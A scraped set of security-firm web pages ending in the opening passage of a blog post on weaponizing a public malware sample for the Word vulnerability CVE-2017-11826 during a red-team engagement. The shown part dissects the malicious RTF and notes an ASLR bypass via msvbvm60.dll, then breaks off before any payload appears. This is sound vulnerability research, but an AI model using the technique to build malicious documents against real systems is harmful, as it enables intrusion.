* [![Digital surveillance service](data:image/gif;base64... "Digital surveillance")
  #### Digital surveillance](https://www.tarlogic.com/digital-surveillance/ "Digital surveillance")
* [![cyber threat intelligence services](data:image/gif;base64... "threat intelligence services")
  #### Threat Intelligence](https://www.tarlogic.com/threat-intelligence/ "threat intelligence services")
* [![Fraud investigation and analysis](data:image/gif;base64... "cyber fraud intelligence")
  #### Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "cyber fraud intelligence")
* [![Strategic Cyber Intelligence](data:image/gif;base64... "Strategic Cyber Intelligence")
  #### Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")

### Attack surface reduction services

* [![vulnerability management services](data:image/gif;base64... "infrastructure vulnerability management")
  #### Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "infrastructure vulnerability management")
* [![emerging vulnerabilities](data:image/gif;base64... "Emerging vulnerability management service 24x7")
  #### Emerging vulnerabilities](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service 24x7")
* [![Denial of Service Test](data:image/gif;base64... "DoS Test")
  #### Denial of service attacks (DoS)](https://www.tarlogic.com/dos-test/ "DoS Test")
* [![Bug bounty services](data:image/gif;base64... "managed bug bounty")
  #### Bug Bounty service](https://www.tarlogic.com/bug-bounty/ "managed bug bounty")
* [![Dynamic Risk Assessment service](data:image/gif;base64... "cyber Threat Priorization")
  #### Dynamic Risk Assessment & Threat Priorization](https://www.tarlogic.com/threat-priorization/ "cyber Threat Priorization")

### Security assessment services

* [![Website security audit](data:image/gif;base64... "Website security audit")
  #### Website Security Audit | OWASP Web Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
* [![mobile app security testing](data:image/gif;base64... "security testing of mobile apps")
  #### Mobile Application Security Audit](https://www.tarlogic.com/mobile-app-audit/ "security testing of mobile apps")
* [![IOT Security services](data:image/gif;base64... "IOT Security testing")
  #### IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IOT Security testing")
* [![Cloud Infrastructures security asesssment](data:image/gif;base64... "Cloud security audit")
  #### Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security audit")
* [![source code security](data:image/gif;base64... "Code Security Audit")
  #### Code Security Audit](https://www.tarlogic.com/code-security-audit/ "Code Security Audit")
* [![Reverse Engineering services](data:image/gif;base64... "Reverse Engineering services & Hardware Hacking services")
  #### Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering services & Hardware Hacking services")
* [![System hardening](data:image/gif;base64... "Cybersecurity Hardening")
  #### Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Cybersecurity Hardening")
* [![bank security services](data:image/gif;base64... "PSD2 security assessment")
  #### Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "PSD2 security assessment")
* [![Cybersecurity Advisors](data:image/gif;base64... "Cybersecurity Advisory")
  #### Cybersecurity Advisors](https://www.tarlogic.com/cybersecurity-advisors/ "Cybersecurity Advisory")

### Protection and response services

* [![Threat Hunting services](data:image/gif;base64... "Threat Hunting")
  #### Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
* [![Incident response services](data:image/gif;base64... "Incident response")
  #### Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident response")

## Looking for Red Teaming services?

Contact our cybersecurity team if you have any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blackarrow-tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:](https://www.google.com/maps?cid=15171011320439567448)

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from www.tarlogic.com_a74be93e_20250126_040704.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/ "EN")
  + [ES](https://www.tarlogic.com/es/ "ES")
  + [IT](https://www.tarlogic.com/it/ "IT")

* EN
  + [ES](https://www.tarlogic.com/es/)
  + [IT](https://www.tarlogic.com/it/)

Tu navegador no soporta la etiqueta de video.

# Cybersecurity experts

**The digital universe is full of threats.** As cybersecurity experts we are here to protect your company from all kinds of cyber attacks. We analyze vulnerable points and protect you against any current or future threats.

[Contact us now](https://www.tarlogic.com/contact/)

## [Website Security Audit](https://www.tarlogic.com/website-security-audit/ "Website Security Audit")

Verifying the security of web applications through a comprehensive audit can help protect the company from the risks and costs associated with security breaches.

## [Mobile app security Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile app security Audit")

We assess your mobile apps' security and provide remediation guidance, ensuring your data stays safe and protected.

## [Penetration testing services](https://www.tarlogic.com/penetration-testing-services/ "Penetration testing services")

Around a hundred specialists work at Tarlogic conducting penetration tests to locate and remediate security weaknesses in your IT infrastructure.

## Cybersecurity services

### We audit your systems and protect them

Tarlogic is one of the leading European providers of cybersecurity services. A technical team of top-level specialists and state-of-the-art solutions to provide auditing, pentesting, vulnerability management, and incident response services.

[Cybersecurity services](https://www.tarlogic.com/cybersecurity-services/ "Cybersecurity services")

![Cybersecurity services](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/home_cybersecurity_blur.webp)

![red team Cyber security](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/home_simulation_blur.webp)

## Red Team

### Realistic cyber attacks to evaluate your defenses

Our experts simulate techniques used by real-world threat actors, attacking continuously and infiltrating stealthily into your company's critical systems to identify weaknesses in defensive layers and strengthen your security.

[Red Team services](https://www.tarlogic.com/red-team-services/ "Red Team services")

## Cyber intelligence

### Discovering threats while supporting your business

Custom threat intelligence methodology, aligned with Tiber-EU, NIS2, and DORA standards to provide high-quality information to your business strategy. Fraud prevention with pioneering solutions against phishing and digital piracy.

[Cyber intelligence services](https://www.tarlogic.com/cyber-intelligence/ "Cyber intelligence services")

![Cyber intelligence](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/home_cyber_intelligence_blur.webp)

![cyber threat hunting](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/home_assesmet_blur.webp)

## Threat Hunting - MDR Services

### A tailored solution for each company

Threat Hunting, also known as Managed Detection and Response (MDR) service, is a proactive security service. Our team of experts continuously and in real-time tracks threats to your systems, identifying suspicious activities even when no alerts are triggered. We detect and contain threats before it's too late.

[Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting services")

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

Our Achievements

130

CYBERSECURITY PROFESSIONALS

275

CUSTOMERS PROTECTED

6.3K

FLAGS CAPTURED

790K

ASSETS AUDITED

10

INNOVATION PROJECTS

![Europe](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/IMG-TAR-EU_blur.webp)

EUROPEAN REGIONAL DEVELOPMENT FUND

A WAY TO MAKE EUROPE

Tarlogic has participated in the ICEX-Next Export Initiation Program and has received support from ICEX through the co-financing of European FEDER funds. The purpose of this support is to contribute to the internationalization of Tarlogic.

![Adversary simulation banner](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/adversary-simulation-blackarrow-dark_s.webp)
![BlackArrow team shield](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blackarrow-shield.png)
## **BlackArrow**Offensive security

### Adversary Simulation

Continuously creating adversary emulations (Red teaming vs Threat Hunting) to fine-tune your defenses and protect your business information.

[BlackArrow](https://www.tarlogic.com/blackarrow/)

## Our Cybersecurity Blogs

Discover the latest articles on cybersecurity and cyberintelligence on [Tarlogic's blog](blog/ "Tarlogic's cybersecurity blog").

[### Cybersecurity blog](blog/category/cybersecurity/)
[![CVE-2024-53677: Critical vulnerability affecting Apache Struts](data:image/gif;base64...)](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)
###### [CVE-2024-53677: Critical vulnerability affecting Apache Struts](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)

19 - December - 2024
S.T.A¬≤.R.S Team

Information has been disclosed about a new critical vulnerability affecting the popular Apache Struts framework. The CVE-2024-53677 vulnerability could allow a remote attacker to e[...]

[Read more](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)

[### BlackArrow blog](blog/category/blackarrow/)
[![MSSQL linked servers: abusing ADSI for password retrieval](data:image/gif;base64...)](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/)
###### [MSSQL linked servers: abusing ADSI for password retrieval](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/)

07 - June - 2023
Pablo Mart√≠nez

Introduction When we talk about Microsoft SQL Server linked servers, we usually think of links to another SQL Server instances. However, this is only one of the multiple available [...]

[Read more](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/)

[### Cyberintelligence blog](blog/category/cyberintelligence/)
[![SIM swapping, when your phone, and your money, are out in the open](data:image/gif;base64...)](https://www.tarlogic.com/blog/sim-swapping-phone-and-money-are-out-in-the-open/)
###### [SIM swapping, when your phone, and your money, are out in the open](https://www.tarlogic.com/blog/sim-swapping-phone-and-money-are-out-in-the-open/)

20 - December - 2022
Cyber Intelligence Team

SIM swapping fraud, the lawless duplication of a cell phone card to impersonate a person‚Äôs identity, is growing. As a result, operators and banks are already reinforcing thei[...]

[Read more](https://www.tarlogic.com/blog/sim-swapping-phone-and-money-are-out-in-the-open/)

[### Cyber 4 all cybersecurity blog](blog/category/cyber-for-all/)
[![How will the Cybersecurity Coordination and Governance Act affect businesses?](data:image/gif;base64...)](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)
###### [How will the Cybersecurity Coordination and Governance Act affect businesses?](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)

23 - January - 2025
Ciber 4 All Team

The draft Cybersecurity Coordination and Governance Act contemplates fines of up to 10 million euros for non-compliant companies Thousands of Spanish companies have been wondering [...]

[Read more](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)

![partners background image](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/alliances_bg.webp)
#### Our alliances

Our Partners / Technology manufacturers

![checkmarx](data:image/gif;base64...)
![kiuwan](data:image/gif;base64...)
![tenable](data:image/gif;base64...)
![sentinelone](data:image/gif;base64...)
![burp suite](data:image/gif;base64...)
![qualys](data:image/gif;base64...)
![blueliv](data:image/gif;base64...)
![cymulate](data:image/gif;base64...)
![crowdstrike](data:image/gif;base64...)
![cobaltstrike](data:image/gif;base64...)
![paloalto cortex](data:image/gif;base64...)
![maltego](data:image/gif;base64...)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from www.tarlogic.com_bb6b34ea_20250124_222958.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/exploiting-word-cve-2017-11826/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/explotando-word-cve-2017-11826/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/explotando-word-cve-2017-11826/)

![Cybersecurity blog header](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog-tarlogic-banner-post_blur.jpg)

[Home](https://www.tarlogic.com)
/
[Blog](https://www.tarlogic.com/blog/)
/
Exploiting Word: CVE-2017-11826

# Exploiting Word: CVE-2017-11826

11 - Dec - 2017
- Javier Gil

Table of Contents

* [0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826](#0x01_%E2%80%93_Initial_analysis_of_the_sample_with_CVE-2017-11826 "0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826")
* [0x02 ‚Äì Analysis of the vulnerabilty](#0x02_%E2%80%93_Analysis_of_the_vulnerabilty "0x02 ‚Äì Analysis of the vulnerabilty")
* [0x03 ‚Äì Analysis of the heap spray](#0x03_%E2%80%93_Analysis_of_the_heap_spray "0x03 ‚Äì Analysis of the heap spray")
* [0x04 ‚Äì Creating the matryoska](#0x04_%E2%80%93_Creating_the_matryoska "0x04 ‚Äì Creating the matryoska")
  + [Modifying activex1.bin](#Modifying_activex1bin "Modifying activex1.bin")
  + [Modifying document.xml](#Modifying_documentxml "Modifying document.xml")
  + [Creating the ZIPs/DOCX](#Creating_the_ZIPsDOCX "Creating the ZIPs/DOCX")
  + [Creating the CDFs](#Creating_the_CDFs "Creating the CDFs")
  + [Modifying the RTF file](#Modifying_the_RTF_file "Modifying the RTF file")
  + [PoK (Proof of Kaboom)](#PoK_Proof_of_Kaboom "PoK (Proof of Kaboom)")
* [0x05 ‚Äì Creating our payload](#0x05_%E2%80%93_Creating_our_payload "0x05 ‚Äì Creating our payload")
* [0x06 ‚Äì Final words](#0x06_%E2%80%93_Final_words "0x06 ‚Äì Final words")

Coincidentially with the beginning of an [APT simulation](https://www.tarlogic.com/blog/apt-intrusion-test/) engagement in the [Red Teaming](https://www.tarlogic.com/red-team-services/), a patch was issued my Microsoft fixing some vulnerabilities (CVE-2017-11826) affecting MS Office. The patch, which fixed a memory corruption bug, was first published on October 10th. On October 11th, Quihoo 360 Core Security reported having found malware exploiting said vulnerability during the previous month.

Due to the existence of public malware samples exploiting this vulnerability and the time lapse between the release of the patch and it being applied, it was decided to begin the engagement by exploiting this vulnerability. In this post we will briefly describe the contents of the Word exploit sample, and we will explain how we can modify it to our benefit, allowing us to deploy our custom APT solution.

## 0x01 ‚Äì Initial analysis of the sample with CVE-2017-11826

The sample is a RTF file. After analyzing its contents, we found the following components:

```
$ rtfobj cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
rtfobj 0.51 - https://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5' - size: 680268 bytes
---+----------+-------------------------------+-------------------------------
id |index     |OLE Object                     |OLE Package
---+----------+-------------------------------+-------------------------------
0  |0003972Dh |format_id: 1 (Linked)          |Not an OLE Package
   |          |class name: ''                 |
   |          |data size: N/A                 |
---+----------+-------------------------------+-------------------------------
1  |00039807h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 53248               |
---+----------+-------------------------------+-------------------------------
2  |000538E9h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 14336               |
---+----------+-------------------------------+-------------------------------
```

If we dump the contents of the RTF file and look for the three objects, we find the following:

```
$ python2 rtf.py --input cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5 --dump
[...]
        object
        objemb
            *
            oleclsid
            '7bD5DE8D20-5BB8-11D1-A1E3-00A0C90F2731
            '7d
            *
            objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000
            result
                pict
                wmetafile8
                picw1
                pich1

        object
        objemb
        objsetsize
        objw9361
        objh764
            *
            objclass Word.Document.12
            *
            objdata 010500000200000011000000576f72642e446f63756d656e742e313200000000000000000000d00000d0cf11e0a1b11ae
[...]
        object
        objemb
        objsetsize
        objw9361
        objh764
            *
            objclass Word.Document.12
            *
            objdata 010500000200000011000000576f72642e446f63756d656e742e313200000000000000000000380000d0cf11e0a1b11ae1
```

The first object loads the library identified by the CLSID D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731. We can look for it in the Windows registry to know which module it points to:

```
C:Usersjavier.gil>reg query HKEY_CLASSES_ROOT /F "D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731" /c /s

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}

End of search: 1 match(es) found.

C:Usersjavier.gil>reg query HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}
    (Default)    REG_SZ    VBPropertyBag

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32

C:Usersjavier.gil>reg query HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32

HKEY_CLASSES_ROOTWOW6432NodeCLSID{D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731}InProcServer32
    (Default)    REG_SZ    C:WindowsSysWOW64msvbvm60.dll
    ThreadingModel    REG_SZ    Apartment
```

This will make Word load that library in memory. Why is it so special?

[![msvbvm60 with no ASLR](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2017/12/no_aslr.png) msvbvm60 with no ASLR

So, by loading this module there will be known code at a fixed address, which is a nice ASLR bypass.

The two remaining objects are Word files. We can use rtfobj to extract them:

```
$ rtfobj -s all cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
rtfobj 0.51 - https://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

===============================================================================
File: 'cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5' - size: 680268 bytes
---+----------+-------------------------------+-------------------------------
id |index     |OLE Object                     |OLE Package
---+----------+-------------------------------+-------------------------------
0  |0003972Dh |format_id: 1 (Linked)          |Not an OLE Package
   |          |class name: ''                 |
   |          |data size: N/A                 |
---+----------+-------------------------------+-------------------------------
1  |00039807h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 53248               |
---+----------+-------------------------------+-------------------------------
2  |000538E9h |format_id: 2 (Embedded)        |Not an OLE Package
   |          |class name: 'Word.Document.12' |
   |          |data size: 14336               |
---+----------+-------------------------------+-------------------------------
Saving raw data in object #0:
  saving object to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw
Saving file embedded in OLE object #1:
  format_id  = 2
  class name = 'Word.Document.12'
  data size  = 53248
  saving to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
Saving file embedded in OLE object #2:
  format_id  = 2
  class name = 'Word.Document.12'
  data size  = 14336
  saving to file cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc

$ l
total 748K
drwxr-xr-x  2 i i 4.0K Nov 30 11:27 .
drwxr-xr-x 11 i i 4.0K Nov 30 11:27 ..
-rw-r--r--  1 i i 665K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5
-rw-r--r--  1 i i   45 Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw
-rw-r--r--  1 i i  52K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
-rw-r--r--  1 i i  14K Nov 30 11:27 cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc

$ file *
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5:                     Rich Text Format data, version 1, unknown character set
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_0003972D.raw: locale data table
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc: Composite Document File V2 Document, Cannot read section info
cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_000538E9.doc: Composite Document File V2 Document, Cannot read section info

$ unzip cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc -d 00039807.doc                                                                                                                             [55/515]
Archive:  cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc
warning [cb3429e608144909ef25df2605c24ec253b10b6e99cbb6657afa6b92e9f32fb5_object_00039807.doc]:  1536 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: 00039807.doc/docProps/app.xml
  inflating: 00039807.doc/docProps/core.xml
   creating: 00039807.doc/word/activeX/
  inflating: 00039807.doc/word/activeX/activeX1.bin
  inflating: 00039807.doc/word/activeX/activeX1.xml
  inflating: 00039807.doc/word/activeX/activeX10.xml
  inflating: 00039807.doc/word/activeX/activeX11.xml
  inflating: 00039807.doc/word/activeX/activeX12.xml
  inflating: 00039807.doc/word/activeX/activeX13.xml
  inflating: 00039807.doc/word/activeX/activeX14.xml
  inflating: 00039807.doc/word/activeX/activeX15.xml
  inflating: 00039807.doc/word/activeX/activeX16.xml
  inflating: 00039807.doc/word/activeX/activeX17.xml
  inflating: 00039807.doc/word/activeX/activeX18.xml
  inflating: 00039807.doc/word/activeX/activeX19.xml
  inflating: 00039807.doc/word/activeX/activeX2.xml
  inflating: 00039807.doc/word/activeX/activeX20.xml
  inflating: 00039807.doc/word/activeX/activeX21.xml
  inflating: 00039807.doc/word/activeX/activeX22.xml
  inflating: 00039807.doc/word/activeX/activeX23.xml
  inflating: 00039807.doc/word/activeX/activeX24.xml
  inflating: 00039807.doc/word/activeX/activeX25.xml
  inflating: 00039807.doc/word/activeX/activeX26.xml
